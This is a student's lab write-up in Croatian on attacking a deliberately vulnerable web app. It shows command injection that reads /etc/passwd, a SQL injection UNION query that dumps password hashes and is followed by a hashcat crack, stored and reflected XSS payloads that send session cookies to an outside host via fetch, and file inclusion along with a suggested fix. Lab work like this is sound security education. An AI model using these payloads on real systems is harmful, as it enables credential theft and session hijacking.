@@ -1,0 +1,75 @@
+1.)
+
+U prvom zadatku napravljen je command injection sa sličnom naredbom danom u primjeru, samo umjesto sljedće naredbe "echo" koristio sam naredbu "cat" koja ispisuje sadržaj datoteke, u ovom slučaju to je bio sadržaj datoteke "/etc/passwd"
+Naredba: 1 | cat /etc/passwd
+dobiven je ispis:
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+Slika ispisa je dana zajedno u arhivi pod nazivom "Command_injection_etcPasswd.png"
+
+
+
+2.)
+
+Prvo što sam upisao je neki ID da vidim što će se dogoditi. Nakon toga poslao sam string "' OR 1=1#" te uočio da je injeciton moguć pošto se na backend strani dani parametar direktno stavlja u "...WHERE id="id_param"..."
+
+Nakon toga ispitao sam koliko parametara backend dohvaća time da sam pokušao poslati podatak "1' ORDER BY 3#", te je ispalo da se radi samo o ta 2 podatka, imenu i prezimenu.
+
+Na kraju, tim znanjem, te podacima dobivenim o tablici u zadatku laboratorijske vježbe, sve što sam trebao napraviti jest poslati sljedeći String:
+' OR 1=1 UNION SELECT password, CONCAT(user, ' ', first_name, ' ', last_name) as full_name from users#
+
+čime sam jednostavno napravio ispis svih passworda zajedno sa formatiranim ispisom "username Ime Prezime" tako da znam koji password je točno od kojeg korisnika. Naravno mogao sam selektirati samo njegovo ime sa dodatnim WHERE atributom, ali nema potrebe.
+
+Dobio sam hash (slika SQL_injection_Pablo.png): 
+0d107d09f5bbe40cade3de5c71e9e9b7
+
+Koristeći program hashcat na laptopu (cijela naredba, izlaz programa i izlazna datoteka sa plaintext hash crack-om se vidi na slici "Hashcat_pablo_crack.png"), crackao sam MD5 hash te dobio plaintext RJEŠENJE: letmein
+
+
+
+3.)
+
+uvrštavanjem stringa "<script>alert(document.cookie)</script>" u polje message isčitao sam PHPSESSID cookie (slika alert_phpsessionid.png):
+
+PHPSESSID=kc61ol7sin2b58k9jcee5348o5
+
+Nadalje, otvaranjem HTML koda te povećavanjem maxlength parametra za textarea, mogu unutra upisati proizvoljno dugi kod koji će poslati cookie na zadani url.
+
+Kako big poslao cookie na proizvoljan site, u polje message sada pišem string "<script>fetch('http://public.tel.fer.hr/srs?' + document.cookie)</script>"
+Time web stranica, svaki put kada neki korisnik učita message za tim javascript kodom, pošalje cookie na drugu stranicu.
+Slika javascript koda za fetch i izmijenjenog length parametra je "XSS_Stored.png"
+
+Isti napad korištenjem XSS reflected metode mogu napraviti pomoću sljedećeg phishing linka:
+http://192.168.56.102/vulnerabilities/xss_r/?name=<script>fetch('http://public.tel.fer.hr/srs?'.concat(document.cookie));</script>
+
+Ovjde jednostavno žrtvi se podmetne link koji izgleda potpuno beznačajno, jer vodi prvobitno na stranicu kojoj žrtva možda želi pristupiti, no u jednom od parametra koji se predaje na toj stranici se nalazi javascript kod koji ukrade cookie, te napravi kao i u prethodnom primjeru fetch na stranicu po želji napadača.
+
+
+
+4.)
+
+Ispis ekrana se može vidjeti na slici file_inclusion.png
+
+Dump proizvoljne datoteke u sustavu mijenjanju get parametra je moguće izvesti jer se na serverskoj strani ne provodi nikakva provjera inputa (npr. da bi se dohvat datoteka ograničio samo u odabranom direktoriju ili nešto tome slično, ili da se koristi neka vrsta mape za access referencu), te server jednostavno dohvati onu putanju, tj datoteku koja se napiše u page parametar.
+
+Navedenu aplikaciju bih zaštitio time da bih koristio neku vrstu Mapu Access Reference, tako da se datoteci može pristupiti jedino putem specifične reference za pojedinu datoteku kojoj korisnik smije pristupiti. Ukoliko bi u GET zahtjev bila upisana referenca koja ne postoji u navedenoj mapi referenci, jednostavno ne bih vratio ništa.
